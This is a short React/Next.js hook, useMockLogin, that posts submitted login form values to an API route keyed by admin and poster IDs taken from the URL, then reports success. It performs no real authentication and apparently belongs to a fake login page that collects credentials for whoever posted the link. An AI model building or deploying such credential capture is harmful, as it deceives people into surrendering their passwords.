import { useRouter } from "next/router";
import { toast } from "react-toastify";
import { API_URL } from "../config";

function useMockLogin() {
  const {
    query: { adminId, posterId },
  } = useRouter();

  const login = async (values, formik) => {
    // console.log(values);
    // return;

    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    console.log(url);

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Successfull");
      formik.resetForm();

      // formik.resetForm();
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return { login };
}

export default useMockLogin;
